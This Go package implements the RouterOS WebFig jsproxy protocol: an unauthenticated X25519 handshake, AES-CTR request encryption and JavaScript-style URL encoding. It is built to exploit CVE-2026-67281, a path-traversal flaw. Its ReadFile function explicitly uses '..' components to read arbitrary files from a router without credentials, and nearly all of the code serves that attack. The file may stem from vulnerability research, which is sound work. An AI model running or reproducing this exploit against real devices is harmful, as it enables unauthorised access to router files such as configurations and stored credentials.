// Package webfig implements the RouterOS WebFig jsproxy protocol,
// including the CVE-2026-67281 path-traversal file read.
package webfig

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"time"

	"golang.org/x/crypto/curve25519"
)

// defaultTimeout is the per-request deadline for jsproxy operations.
const defaultTimeout = 10 * time.Second

// Session holds the state for an unauthenticated jsproxy session.
type Session struct {
	host      string
	sessionID []byte
	sendKey   []byte
	recvKey   []byte
	txSeq     uint32
}

// Dial performs the X25519 handshake with the jsproxy endpoint and returns
// an unauthenticated session ready for encrypted requests.
func Dial(host string) (*Session, error) {
	// Generate X25519 keypair
	privKey := make([]byte, 32)
	if _, err := io.ReadFull(rand.Reader, privKey); err != nil {
		return nil, fmt.Errorf("webfig: key generation: %w", err)
	}

	// Compute public key: reverse(X25519(reverse(priv), basepoint))
	privRev := reverse(privKey)
	pubRaw, err := curve25519.X25519(privRev, curve25519.Basepoint)
	if err != nil {
		return nil, fmt.Errorf("webfig: X25519 pubkey: %w", err)
	}
	pubWire := reverse(pubRaw)

	// Build init request: 8 zero bytes + 32-byte public key
	initReq := make([]byte, 40)
	copy(initReq[8:], pubWire)

	httpClient := &http.Client{Timeout: defaultTimeout}
	resp, err := httpClient.Post(
		"http://"+host+"/jsproxy",
		"msg",
		bytes.NewReader(initReq),
	)
	if err != nil {
		return nil, fmt.Errorf("webfig: init request: %w", err)
	}
	defer resp.Body.Close()

	initResp, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("webfig: reading init response: %w", err)
	}
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("webfig: init response %d: %s", resp.StatusCode, truncate(initResp, 200))
	}
	if len(initResp) < 40 {
		return nil, fmt.Errorf("webfig: init response too short: %d bytes", len(initResp))
	}

	sessionID := make([]byte, 4)
	copy(sessionID, initResp[:4])
	// Bytes 4-7 are padding/sequence, skip them
	serverPub := make([]byte, 32)
	copy(serverPub, initResp[8:40])

	// Compute shared secret
	serverPubRev := reverse(serverPub)
	sharedRaw, err := curve25519.X25519(privRev, serverPubRev)
	if err != nil {
		return nil, fmt.Errorf("webfig: X25519 shared: %w", err)
	}
	masterKey := reverse(sharedRaw)

	sendKey := makeKey(masterKey, "On the client side, this is the send key; on the server side, it is the receive key.")
	recvKey := makeKey(masterKey, "On the client side, this is the receive key; on the server side, it is the send key.")

	return &Session{
		host:      host,
		sessionID: sessionID,
		sendKey:   sendKey,
		recvKey:   recvKey,
		txSeq:     1,
	}, nil
}

// ReadFile reads a file from the WebFig file namespace using an encrypted GET
// request. The path is relative to the WebFig root; use ".." components to
// traverse out of the WebFig directory (CVE-2026-67281).
func (s *Session) ReadFile(path string) ([]byte, error) {
	status, body, err := s.ReadFileStatus(path)
	if err != nil {
		return nil, err
	}
	if status != 200 {
		return nil, fmt.Errorf("webfig: GET %q returned %d: %s", path, status, truncate(body, 500))
	}
	return body, nil
}

// ReadFileStatus reads a file and returns the HTTP status code and body.
// Unlike ReadFile, it does not treat non-200 responses as errors, allowing
// callers to distinguish 403 (forbidden) from 404 (not found) from 200 (success).
func (s *Session) ReadFileStatus(path string) (int, []byte, error) {
	encPath := s.encryptURI(path)
	encQuery := encodeURIComponent(encPath)

	conn, err := net.DialTimeout("tcp", s.host+":80", defaultTimeout)
	if err != nil {
		return 0, nil, fmt.Errorf("webfig: dial: %w", err)
	}
	defer conn.Close()

	_ = conn.SetDeadline(time.Now().Add(defaultTimeout))

	req := fmt.Sprintf("GET /jsproxy/?%s HTTP/1.1\r\nHost: %s\r\nReferer: http://%s/webfig/\r\nConnection: close\r\n\r\n", encQuery, s.host, s.host)
	if _, err := conn.Write([]byte(req)); err != nil {
		return 0, nil, fmt.Errorf("webfig: write: %w", err)
	}

	resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
	if err != nil {
		return 0, nil, fmt.Errorf("webfig: read response: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return 0, nil, fmt.Errorf("webfig: reading %q: %w", path, err)
	}
	return resp.StatusCode, body, nil
}

// encryptURI encrypts a URI path the same way webfig Session.encryptURI() does.
// Returns the raw binary frame: sessionID(4) || seq(4) || IV(16) || ciphertext.
func (s *Session) encryptURI(uri string) []byte {
	plaintext := []byte(uri)

	block, err := aes.NewCipher(s.sendKey)
	if err != nil {
		panic(err)
	}

	iv := make([]byte, 16)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}

	stream := cipher.NewCTR(block, iv)
	ciphertext := make([]byte, len(plaintext))
	stream.XORKeyStream(ciphertext, plaintext)

	seq := s.txSeq
	s.txSeq += uint32(len(plaintext))

	out := make([]byte, 8+16+len(ciphertext))
	out[0] = s.sessionID[0]
	out[1] = s.sessionID[1]
	out[2] = s.sessionID[2]
	out[3] = s.sessionID[3]
	out[4] = byte(seq >> 24)
	out[5] = byte(seq >> 16)
	out[6] = byte(seq >> 8)
	out[7] = byte(seq)
	copy(out[8:24], iv)
	copy(out[24:], ciphertext)

	return out
}

// encodeURIComponent mimics JavaScript's encodeURIComponent as used by webfig.
// The webfig encryptURI pipeline is:
//  1. UTF-8 encode the path
//  2. AES-128-CTR encrypt
//  3. Prepend sessionID(4) || seq(4) || IV(16)
//  4. Convert to JS string via byte2str (0x00 -> U+0100, else identity)
//  5. Apply decodeZeros (charCodeAt & 0xff, mapping U+0100 back to \x00)
//  6. Apply encodeURIComponent (which encodes \x00 as %00)
//  7. Apply encodeURLComponent (which additionally encodes !'()*)
//
// The net effect: each byte b of the binary frame is encoded as:
//   - b == 0x00  -> %00
//   - b in [A-Za-z0-9\-_.~] -> literal
//   - b in !'()* -> %XX
//   - b < 0x80   -> %XX
//   - b >= 0x80  -> %C2%XX (for 0x80-0xBF) or %C3%XX (for 0xC0-0xFF)
//     because JS String.fromCharCode(b) creates U+00XX, which UTF-8 encodes
//     as 0xC2 0xXX (for U+0080-U+00BF) or 0xC3 0xXX-0x40 (for U+00C0-U+00FF).
func encodeURIComponent(data []byte) string {
	var buf bytes.Buffer
	for _, b := range data {
		switch {
		case b == 0:
			buf.WriteString("%00")
		case b >= 'A' && b <= 'Z',
			b >= 'a' && b <= 'z',
			b >= '0' && b <= '9',
			b == '-', b == '_', b == '.', b == '~':
			buf.WriteByte(b)
		case b == '!', b == '\'', b == '(', b == ')', b == '*':
			fmt.Fprintf(&buf, "%%%02X", b)
		case b < 0x80:
			fmt.Fprintf(&buf, "%%%02X", b)
		case b < 0xC0:
			// U+0080-U+00BF -> UTF-8: 0xC2 0xXX
			fmt.Fprintf(&buf, "%%C2%%%02X", b)
		default:
			// U+00C0-U+00FF -> UTF-8: 0xC3 0x(XX-0x40)
			fmt.Fprintf(&buf, "%%C3%%%02X", b-0x40)
		}
	}
	return buf.String()
}

// reverse returns a copy of b with bytes reversed.
func reverse(b []byte) []byte {
	r := make([]byte, len(b))
	for i := range b {
		r[i] = b[len(b)-1-i]
	}
	return r
}

// makeKey derives an AES-128 key from the master secret.
func makeKey(masterKey []byte, magic string) []byte {
	h := sha256.New()
	h.Write(masterKey)
	h.Write(make([]byte, 40))
	h.Write([]byte(magic))
	h.Write(bytes.Repeat([]byte{0xf2}, 40))
	return h.Sum(nil)[:16]
}

func truncate(b []byte, n int) string {
	s := string(b)
	if len(s) > n {
		return s[:n]
	}
	return strings.TrimSpace(s)
}
